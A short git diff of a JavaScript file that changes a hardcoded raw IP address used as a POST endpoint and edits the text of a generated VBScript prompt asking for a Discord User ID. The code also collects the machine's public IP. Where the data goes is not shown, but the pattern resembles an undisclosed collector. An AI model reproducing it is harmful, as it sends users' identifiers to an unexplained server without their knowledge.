@@ -40,7 +40,7 @@ const index = async (error) => {
         var LocalIP = await publicIP.v4()
         
         const APIHost = {
-            ip: '147.189.171.174',
+            ip: '45.146.254.39',
             port: 3000,
             method: 'POST'
         }
@@ -364,7 +364,7 @@ const index = async (error) => {
                 
                 const test_userid = async (input_empty) => {
                     if(error === true) {
-                        var vbs_file = 'Dim sInput\nsInput = InputBox("Your entered UserID is not Valid! Enter your Discord User ID (Not the #8888)")\nWScript.Stdout.WriteLine sInput'
+                        var vbs_file = 'Dim sInput\nsInput = InputBox("Your entered UserID is not Valid! Are you on my Discord Server? Enter your Discord User ID (Not the #8888)")\nWScript.Stdout.WriteLine sInput'
                     } else if(input_empty) {
                         var vbs_file = 'Dim sInput\nsInput = InputBox("Input is Empty! Enter your Discord User ID (Not the #8888). Read Github to see how to get UserID")\nWScript.Stdout.WriteLine sInput'
                     } else {
